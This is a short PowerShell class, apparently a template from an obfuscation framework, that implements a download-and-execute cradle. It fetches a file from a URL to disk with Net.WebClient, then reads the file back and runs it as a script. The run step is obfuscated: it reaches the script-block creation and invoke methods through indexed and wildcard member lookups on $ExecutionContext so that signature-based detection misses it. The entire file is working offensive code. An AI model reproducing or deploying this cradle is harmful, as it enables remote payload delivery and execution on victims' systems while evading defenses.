Class ObfDownloadFile12 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\7
        (New-Object Net.WebClient).DownloadFile($url,$path);Invoke-Command(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|%{(LS Variable:_).Value.(($ExecutionContext.(($ExecutionContext|GM)[6].Name).PsObject.Methods|Where{(Get-Item Variable:_).Value.Name-ilike'*S*i*ck'}).Name).Invoke((-Join(((CONTENT $path -Enc 3)|ForEach{$_-As'Char'}))))}))

    }

}